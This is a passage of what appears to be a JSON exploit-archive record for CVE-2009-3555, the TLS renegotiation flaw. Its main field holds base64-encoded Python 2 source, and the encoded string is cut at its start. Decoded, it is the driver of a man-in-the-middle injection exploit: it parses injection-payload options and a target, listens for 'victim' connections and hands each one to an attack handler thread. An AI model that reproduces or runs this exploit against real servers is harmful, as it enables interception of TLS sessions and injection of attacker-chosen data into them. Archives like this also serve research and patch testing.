cmVfdHJ1ZSIsIGRlZmF1bHQ9RmFsc2UsIGhlbHA9J2Ryb3Agc2VydmVyIHJlc3BvbnNlcyBhZnRlciByZW5lZ290aWF0aW5nJykNCg0KICAgIChvcHRpb25zLCBhcmdzKSA9IHBhcnNlci5wYXJzZV9hcmdzKCkNCg0KICAgIGlmIGxlbihbaSBmb3IgaSBpbiAob3B0aW9ucy5pbmplY3QsIG9wdGlvbnMuaW5qZWN0X2ZpbGUsIG9wdGlvbnMuaW5qZWN0X2Jhc2U2NCkgaWYgaV0pICE9IDE6DQogICAgICAgIHByaW50ICdFeGFjdGx5IG9uZSBpbmplY3Rpb24gb3B0aW9uIG11c3QgYmUgc3BlY2lmaWVkJw0KICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgaWYgb3B0aW9ucy5pbmplY3RfZmlsZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3B0aW9ucy5pbmplY3QgPSBvcGVuKG9wdGlvbnMuaW5qZWN0X2ZpbGUsICdyJykucmVhZCgpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yLCBleDoNCiAgICAgICAgICAgIHByaW50IGV4DQogICAgICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgaWYgb3B0aW9ucy5pbmplY3RfYmFzZTY0Og0KICAgICAgICBpbXBvcnQgYmFzZTY0DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIG9wdGlvbnMuaW5qZWN0ID0gYmFzZTY0LmRlY29kZXN0cmluZyhvcHRpb25zLmluamVjdF9iYXNlNjQpDQogICAgICAgIGV4Y2VwdCBiYXNlNjQuYmluYXNjaWkuRXJyb3IsIGV4Og0KICAgICAgICAgICAgcHJpbnQgJ0Vycm9yIGRlY29kaW5nIGJhc2U2NCBkYXRhOiAlcycgJSBleA0KICAgICAgICAgICAgc3lzLmV4aXQoMSkNCg0KDQogICAgaWYgbm90IG9wdGlvbnMubGlzdGVuX3BvcnQgb3IgXA0KICAgICAgIG5vdCBvcHRpb25zLmJpbmRfYWRkcmVzcyBvciBcDQogICAgICAgbm90IG9wdGlvbnMudGFyZ2V0IG9yIFwNCiAgICAgICBub3Qgb3B0aW9ucy5pbmplY3Q6DQogICAgICAgIHBhcnNlci5wcmludF9oZWxwKCkNCiAgICAgICAgc3lzLmV4aXQoMSkNCg0KICAgIHRhcmdldCA9IG9wdGlvbnMudGFyZ2V0LnNwbGl0KCc6JykNCiAgICBpZiBsZW4odGFyZ2V0KT09MjoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgdGFyZ2V0WzFdID0gaW50KHRhcmdldFsxXSkNCiAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6DQogICAgICAgICAgICB0YXJnZXRbMV0gPSBOb25lDQogICAgaWYgbGVuKHRhcmdldCkhPTIgb3Igbm90IHRhcmdldFswXSBvciBub3QgdGFyZ2V0WzFdOg0KICAgICAgICBwcmludCAnVGFyZ2V0IFwnJXNcJyBub3QgaW4gZm9ybWF0IEhPU1Q6UE9SVCcgJSBvcHRpb25zLnRhcmdldA0KICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgb3B0aW9ucy50YXJnZXQgPSB0dXBsZSh0YXJnZXQpDQoNCiAgICB0cnk6DQogICAgICAgIGxpc3RlbnNvY2tldCA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgICAgICAgbGlzdGVuc29ja2V0LmJpbmQoKG9wdGlvbnMuYmluZF9hZGRyZXNzLCBvcHRpb25zLmxpc3Rlbl9wb3J0KSkNCiAgICAgICAgcHJpbnQgJ0xpc3RlbmluZyBvbiAlczoldScgJSAob3B0aW9ucy5iaW5kX2FkZHJlc3MsIG9wdGlvbnMubGlzdGVuX3BvcnQpDQogICAgZXhjZXB0IHNvY2tldC5lcnJvciwgZXg6DQogICAgICAgIHByaW50ICdDb3VsZG5cJ3QgbGlzdGVuIG9uICVzOiV1JyAlIChvcHRpb25zLmJpbmRfYWRkcmVzcywgb3B0aW9ucy5saXN0ZW5fcG9ydCkNCiAgICAgICAgcHJpbnQgJ0Vycm9yIGNvZGUgJXUsIFwnJXNcJycgJSAoZXhbMF0sIGV4WzFdKQ0KICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgbGlzdGVuc29ja2V0LnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQsIHNvY2tldC5TT19SRVVTRUFERFIsIDEpDQogICAgbGlzdGVuc29ja2V0Lmxpc3Rlbig1KQ0KDQogICAgbWl0bWNvdW50ID0gMA0KDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgdmljdGltLCB2aWN0aW1hZGRyID0gbGlzdGVuc29ja2V0LmFjY2VwdCgpDQogICAgICAgICAgICBwcmludCAnTmV3IGNvbm5lY3Rpb24gZnJvbSAlczoldScgJSB2aWN0aW1hZGRyDQoNCiAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWhhbmRsZV92aWN0aW0sIGFyZ3M9KHZpY3RpbSwgb3B0aW9ucywgbWl0bWNvdW50KSkuc3RhcnQoKQ0KICAgICAgICAgICAgbWl0bWNvdW50ICs9IDENCg0KICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQsIGV4Og0KICAgICAgICAgICAgcHJpbnQgJ1xuQWJvcnRlZCBieSB1c2VyLCBleGl0aW5nLi4uJw0KICAgICAgICAgICAgbGlzdGVuc29ja2V0LmNsb3NlKCkNCiAgICAgICAgICAgIHN5cy5leGl0KDEp", 
    "filename": "platforms/multiple/remote/10579.py", 
    "id": "10579", 
    "cves": [
        "CVE-2009-3555"
    ]
}